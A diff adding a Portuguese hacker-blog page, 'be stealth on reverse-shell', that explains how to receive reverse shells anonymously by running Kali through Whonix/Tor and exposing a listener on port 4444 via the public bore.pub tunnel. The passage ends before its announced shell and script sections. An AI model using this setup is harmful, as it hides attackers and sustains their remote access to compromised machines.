@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="pt-BR" class="paper-mode">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>be stealth on reverse-shell | @b1tk1ll</title>
+  <link rel="icon" type="image/png" href="../../static/favicon.png">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="be stealth on reverse-shell | @b1tk1ll">
+  <meta property="og:description" content="vá para as montanhas, somente lá! existe a verdadeira paz que você tanto procura, amigo.">
+  <meta property="og:image" content="https://thebixowithsevenheads.wtf/static/media/posts/rev-shell/rev.jpg">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="be stealth on reverse-shell | @b1tk1ll">
+  <meta name="twitter:description" content="vá para as montanhas, somente lá! existe a verdadeira paz que você tanto procura, amigo.">
+  <meta name="twitter:image" content="https://thebixowithsevenheads.wtf/static/media/posts/rev-shell/rev.jpg">
+  <link rel="stylesheet" href="../../static/style.css">
+</head>
+<body class="paper-mode">
+
+<div id="wrapper" class="paper-shell">
+
+  <div class="paper-top-nav">--[ <a class="paper-top-nav__link" href="../../index.html">HOME</a> ]------------------------------------------------------------------------------------------------------------------------</div>
+
+  <div id="main-col">
+    <pre class="paper-document"><div class="paper-callout paper-callout--summary"><div class="paper-callout__label">Summary</div><pre class="paper-callout__body paper-callout__body--pre">0x01 - My SetUp (kaliVM over Whonix)
+0x02 - p1ng tunn3l! :p
+0x03 - get a shell!
+0x04 - pgswp.sh: D</pre></div>
+<span class="paper-line-bg">O intuito desse paper é simples! quer subir shell e tá sem VPS? então leia (ou não também, foda-sekkkkkkk)</span>
+
+<span class="paper-line-bg">O passo a passo é basicamente esse:</span>
+<span class="paper-line-bg">1. setup-ar uma VM over TOR</span>
+<span class="paper-line-bg">2. obter os binarios e subir o tunnel (para mascarar o IP)</span>
+<span class="paper-line-bg">3. testar e ver se funciona!</span>
+
+
+
+<span class="paper-line-bg">--[ 0x01 ]-- [ My SetUp (kaliVM over Whonix) ] -----------------------------------------------------------------------------------</span>
+
+
+
+
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀▗▄▄▖▗▄▄▄▖▗▄▄▄▖▗▖⠀▗▖▗▄▄▖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀▐▌⠀⠀⠀▐▌⠀⠀⠀⠀⠀█⠀⠀▐▌⠀▐▌▐▌⣀▐▌⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀▝▀▚▖▐▛▀▀▘⠀⠀█⠀⠀▐▌⣤▐▌▐▛▀▘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀▗▄▄▞▘▐▙▄▄▖⠀⠀█⣤⣾▝▚▄▞▘▐▌⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⠿⠛⠛⠀⠀⠀⠀⠀⠀⡀⠀⠘⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⡿⠛⢉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣷⣤⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⣠⡆⠀⠀⠀⠀⠀⠀⠀⠀⠸⣶⣄⠈⢿⣿⣧⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⡟⠀⣴⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⣼⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⣿⣿⡆⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣆⠀⠿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠟⠁⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠙⠿⣷⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⠟⠁⣰⣿⣿⣿⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣷⣤⣄⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠊⢉⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣤⣀⣀⣀⠀⡀⣀⣀⣀⣀⣤⣴⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⢈⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢁⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠘⢿⣶⣦⠀⢈⡉⠛⠛⠻⠿⠿⠿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠛⠋⠉⣀⣤⣶⡟⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡈⠻⣿⠀⢸⣿⣿⣶⣶⡆⠀⣤⣤⣤⣄⣠⡀⢠⣤⣤⣤⣶⣶⠀⣿⣿⣿⠏⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡈⠀⢸⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⠀⡿⠏⢁⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡈⠙⠻⠿⡇⠀⣿⣿⣿⣿⣿⠆⢸⣿⣿⣿⡿⠏⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣄⣀⡉⠙⠛⠛⠛⠂⠘⠉⢉⣀⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    </span>
+<span class="paper-line-bg">░  ░░░░  ░░  ░░░░  ░░░░░░░░   ░░░  ░░        ░░░      ░░░░      ░░░░      ░░</span>
+<span class="paper-line-bg">▒  ▒▒▒▒  ▒▒   ▒▒   ▒▒▒▒▒▒▒▒    ▒▒  ▒▒▒▒▒  ▒▒▒▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒  ▒</span>
+<span class="paper-line-bg">▓▓  ▓▓  ▓▓▓        ▓▓▓▓▓▓▓▓  ▓  ▓  ▓▓▓▓▓  ▓▓▓▓▓  ▓▓▓   ▓▓  ▓▓▓   ▓▓  ▓▓▓▓  ▓</span>
+<span class="paper-line-bg">███    ████  █  █  ████████  ██    █████  █████  ████  ██  ████  ██        █</span>
+<span class="paper-line-bg">████  █████  ████  ████████  ███   ██        ███      ████      ███  ████  █</span>
+
+
+
+
+<span class="paper-line-bg">Bom... primeiro, tenha uma <span class="paper-inline-code paper-inline-code--red">Virtual Machine over TOR</span>!</span>
+
+<div class="paper-callout paper-callout--note"><div class="paper-callout__label">NOTE</div><div class="paper-callout__body"><p>Você pode escolher sua VM.<br>Eu to usando o gateway do whonix dentro da distro do kali-linux.<br>Dai eu derrubei todas as interfaces de rede padrão do kali, e subi só uma que se conecta ao gateway do whonix<br>Existem tutoriais por ai para fazer isso, aqui está um deles: <a href="https://medium.com/@redfanatic7/complete-anonymity-on-kali-linux-using-tor-whonix-and-vpn-16cf9aa2ebdc" class="paper-link"><span class="paper-inline-code paper-inline-code--red">complete-anonymity-on-kali-linux-using-tor-whonix-and-vpn</span></a></p><p>KALI <span class="paper-inline-code paper-inline-code--red">-&gt;</span> WHONIX GATEWAY <span class="paper-inline-code paper-inline-code--red">-&gt;</span> TOR <span class="paper-inline-code paper-inline-code--red">-&gt;</span> INTERNET</p></div></div>
+
+<span class="paper-line-bg">Agora, só pra validar vou dar um curl no check.torproject.org só pra verificar se tá tudo certo.</span>
+
+
+<div class="pre-wrap"><div class="pre-header"><span class="paper-code-label paper-code-label--bash">BASH</span></div><pre><code class="hljs language-bash">32@64~# curl https://check.torproject.org -s | grep <span class="hljs-string">&quot;Congratulations&quot;</span>
+      Congratulations. This browser is configured to use Tor.
+      Congratulations. This browser is configured to use Tor.</code></pre></div>
+
+
+<span class="paper-line-bg">ok! tudo certo, nossa VM está buscando dados através do TOR, podemos partir para implementação do tunnel!</span>
+
+
+
+
+<span class="paper-line-bg">--[ 0x02 ]-- [ p1ng tunn3l! :p ] -------------------------------------------------------------------------------------------------</span>
+
+
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡿⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡶⠶⢖⠦⣄⠀⠀⠀⠀⠀⠀⠀</span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣷⡀⠀⠀⠀⠀⠀⠐⠋⠉⠉⠛⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⠀⠀⢀⠇⠈⢳⠀⠀⠀⠀⠀⠀</span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀_⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⠀⠀⠀⢀⣀⣠⠤⠤⠤⠤⠤⠤⠤⢌⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⢻⠀⠀⠀⠀⠈⠀⠀⢸⠇⠀⠀⠀⠀⠀</span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀|⠀|__⠀⠀⠀___⠀⠀⠀⠀⠀⠀⠀⠀⣼⠁⣠⠤⠒⣋⡭⠤⠒⠒⠉⠉⡩⢟⣣⣤⣀⡢⣬⣉⠒⠤⣄⠀⠀⠀⠀⠀⠀⠀⠀⢼⠈⠃⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⠀⠀⠀</span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀|⠀'_⠀\⠀/⠀_⠀\⠀⠀⠀⠀⠀⠀⣠⠖⣉⠴⠒⠉⠀⠀⠀⠀⠀⢀⣞⣴⠟⠋⠉⠛⢿⣾⣎⠑⢤⡀⠙⠢⣄⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀⣸⠃⠀⠀⠀⠀⠀⠀</span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀|⠀|_)⠀|⠀⠀__/⠀⠀⠀⢀⡴⢋⡤⢊⣁⡀⠀⠀⠀⠀⠀⠀⠀⣞⣾⠃⠀⠀⠀⠀⠀⠹⣿⡄⠀⠱⡄⠀⠈⠑⣄⠀⠀⢀⣠⣽⠶⠶⠶⠒⠒⠒⠛⢤⣄⡀⠀⠀⠀⠀</span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀|_.__/⠀\___|⠀⠀⣠⠋⡴⢋⢔⣭⣴⣿⣷⣤⠀⠀⠀⠀⠰⣽⠃⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠘⡄⠀⠀⠈⢳⣶⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠯⠻⣦⡀⠀⠀</span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡜⢡⠎⢠⢯⣿⠋⠁⠀⠈⠻⣷⠀⠀⠀⠀⡏⠀⠀⠀⠐⢷⢶⣄⠀⠀⣿⠀⠀⠐⠁⠀⠀⢰⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠪⠙⣆⠀</span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⢠⠃⠀⣮⡿⠁⠀⠀⠀⠀⠀⠻⣇⠀⠀⢸⡇⠀⠀⢀⠀⣸⣷⣻⡄⠀⣿⠀⠀⠀⠀⠀⠀⣏⠓⠒⢀⣀⣀⣀⣀⣀⣀⣀⣀⠀⢠⠖⠀⠀⠀⠘⡄</span>
+<span class="paper-line-bg">⠀⠀⣀⣠⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⢀⠇⠀⢰⣿⠇⠀⠀⠀⠀⠶⣶⡄⢹⠀⠀⠀⡇⠀⠀⣾⢹⣿⣿⣏⡇⠀⣿⠀⠀⣀⣤⡤⠤⣼⣶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠉⠙⡇⠀⠀⠀⠀⠀⠀</span>
+<span class="paper-line-bg">⣠⢾⠋⠀⠀⠈⠻⡷⣄⠀⠀⠀⠀⠀⠀⢰⠁⠸⠀⠀⠸⣿⠀⠀⠀⠀⣄⣀⣷⣽⣸⠀⠀⠀⣇⠀⠀⠸⣞⣿⣅⣽⠁⢀⣇⣴⠞⠋⠁⠀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⠀⠀⠀⠀⠀⠀</span>
+<span class="paper-line-bg">⡇⠘⠂⠀⠀⠀⠀⠁⠘⡆⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⣇⣿⣿⣿⣿⠀⠀⠀⠸⡄⠀⠀⠙⠧⠽⠃⠀⡼⠋⠀⠀⠀⠀⠀⣯⠦⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀</span>
+<span class="paper-line-bg">⢳⡀⠀⠀⠀⠀⠀⠀⢀⣹⣤⣤⣤⣤⣄⡇⠀⠰⠀⠀⠀⣿⠀⠀⠀⠀⢻⡽⠿⣾⢹⠀⠀⠀⠀⠻⡄⠀⠀⠀⠀⢠⠞⠁⠀⣀⣀⡀⠀⠀⠘⢧⡀⣠⣤⡶⠖⠛⠛⠛⠒⠒⡞⠀⠀⠀⠀⠀⠀⢀⠀</span>
+<span class="paper-line-bg">⠀⠉⠳⣄⠀⢀⡤⡺⠛⠉⠀⠀⠀⠀⠈⣻⢦⠀⠀⠀⠀⢻⡆⠀⠀⠀⠈⠻⠟⢁⡎⠀⠀⠀⠀⠀⠙⠦⣄⣀⣤⠟⠀⠀⠉⣀⣀⣀⡉⠂⠀⠀⣽⣏⠁⠀⠀⠀⠀⠀⠀⠀⢇⠀⠀⠀⠀⠀⢠⡞⠀</span>
+<span class="paper-line-bg">⠀⠀⠀⢈⣷⠋⠀⠁⠀⠀⠀⠀⠀⢈⣩⣤⣼⣧⣤⡀⠀⠀⠻⡄⠀⠀⠀⠀⢀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣈⣭⠵⠒⠋⠉⠂⠀⠀⠹⡌⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀</span>
+<span class="paper-line-bg">⠀⠀⠀⣾⠋⠀⠀⠀⠀⠀⢀⡤⠞⠉⠉⠀⠀⠀⠈⣻⡆⠀⣀⣙⡦⠤⣀⣤⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠋⣡⡏⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⡀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠋⠁⠀⠀⠀</span>
+<span class="paper-line-bg">⠀⠀⢸⠇⠀⠀⠀⠀⢀⡶⠉⠀⠀⠀⠀⠀⠀⠀⠈⠁⡧⠋⠉⠁⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠚⠉⠀⢀⣴⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠁⠈⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀</span>
+<span class="paper-line-bg">⠀⠀⢸⠀⠀⠀⠉⠑⢏⠀⠀⠀⠀⠀⠀⣀⣤⠶⠶⠾⣧⡀⠀⠀⠀⠀⠀⣤⣤⣤⣤⡤⠒⠒⠉⠁⠀⠀⣀⣤⣶⠿⢿⡿⠀⠀⠀⠀⠀⠀⠀⠀⢀⡶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀</span>
+<span class="paper-line-bg">⠀⠀⠈⡆⠀⠀⠀⠀⠈⠇⠀⠀⢀⡤⠚⠉⠀⠀⠀⠐⠁⡇⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣶⣶⣶⣶⣾⠿⣿⡟⠁⠀⣼⠃⠀⠀⠀⠀⠀⣠⠞⣠⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀</span>
+<span class="paper-line-bg">⠀⠀⠀⠹⡄⠀⠀⠀⠀⠀⠀⠉⠻⡄⠀⠀⠀⠀⠀⠀⣰⠁⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⠃⣠⠏⠀⠀⣰⠏⠀⠀⠀⠀⠠⠞⢁⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀</span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠊⠀⠀⠀⠀⢀⡴⠋⠳⢄⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⠁⠊⠀⠀⢀⡰⠋⠀⠀⠀⠀⠀⣠⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀</span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠈⠑⠦⣀⡀⠀⠀⠀⠀⠀⣀⡠⠖⠋⠀⠀⠀⠀⠙⠢⢄⡀⠀⠀⠀⠀⠈⠛⢿⣇⣀⣀⣠⠴⠋⠀⠀⠀⢀⣀⠤⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀</span>
+<span class="paper-line-bg">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠒⠒⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠒⠤⢤⣀⣀⣀⣀⣀⣀⣀⣀⡠⠤▗⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀▝▜⠀⠀⠀▗⠀⠀▐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀</span>
+<span class="paper-line-bg">                                     ▄▖ ▗▟▄  ▄▖  ▄▖  ▐  ▗▟▄ ▐▗▖        </span>
+<span class="paper-line-bg">                                    ▐ ▝  ▐  ▐▘▐ ▝ ▐  ▐   ▐  ▐▘▐        </span>
+<span class="paper-line-bg">                                     ▀▚  ▐  ▐▀▀ ▗▀▜  ▐   ▐  ▐ ▐        </span>
+<span class="paper-line-bg">                                    ▝▄▞  ▝▄ ▝▙▞ ▝▄▜  ▝▄  ▝▄ ▐ ▐        </span>
+
+
+
+<span class="paper-line-bg">Chegou a hora do tunnel</span>
+
+<span class="paper-line-bg">Aqui, nós precisamos abrir um tunnel, para que nossa conexão trafegue por ele!</span>
+
+<div class="paper-callout paper-callout--note"><div class="paper-callout__label">NOTE</div><div class="paper-callout__body"><p>Pra abrir o tunnel irei usar o bore! ele é opensource, e sem burocracia de criar conta igual aos tuneis da cloudflare!!!<br>Porém é temporário, diferente do <span class="paper-inline-code paper-inline-code--red">cloudflared</span> que sobe o mesmo endereço:porta sempre (caso você tenha um dominio).</p></div></div>
+
+<span class="paper-line-bg">o repositorio do bore está aqui -&gt; <a href="https://github.com/ekzhang/bore" class="paper-link"><span class="paper-inline-code paper-inline-code--red">ekzhang/bore</span></a></span>
+
+<span class="paper-line-bg">o bore suporta muita coisa... inclusive se você quiser deixar um tunnel exposto externamente pra você se conectar em alguma VPS ou</span>
+<span class="paper-line-bg">maquina, você consegue (<span class="paper-inline-code paper-inline-code--red">bore server</span>).</span>
+<span class="paper-line-bg">Mas, como não iremos fazer self-hosting aqui, iremos usar o servidor padrão do bore, que é o bore.pub</span>
+
+
+<span class="paper-line-bg">pra subir uma conexão TCP com o servidor padrão do bore, é só usar:</span>
+
+<div class="pre-wrap"><div class="pre-header"><span class="paper-code-label paper-code-label--bash">BASH</span></div><pre><code class="hljs language-bash">32@64~# bore <span class="hljs-built_in">local</span> 4444 --to bore.pub</code></pre></div>
+
+
+<span class="paper-line-bg"><span class="paper-inline-code paper-inline-code--red">(fico imaginando as coisas que o administrador desse servidor deve ver nos logs diariamentekkkkkkkkkk)</span></span>
+
+
+<span class="paper-line-bg">o bore funciona assim:</span>
+
+<span class="paper-line-bg">a gente abre uma conexão que se mantém ativa o tempo todo entre o server(<span class="paper-inline-code paper-inline-code--red">bore.pub:port</span>) e o client (<span class="paper-inline-code paper-inline-code--red">my-connection over TCP</span>)</span>
+
+
+<span class="paper-line-bg">                                TCP</span>
+<span class="paper-line-bg">LOCAL CLIENT BORE &lt;-----------------------------&gt; SERVER BORE</span>
+
+
+<span class="paper-line-bg">Se você obersevar a conexão via <span class="paper-inline-code paper-inline-code--red">WIRESHARK</span>, vai ver que o tunnel fica pingando nossa maquina a cada segundo,</span>
+<span class="paper-line-bg">enviando o code: &quot;<span class="paper-inline-code paper-inline-code--red">HeartBeat</span>&quot;</span>
+
+
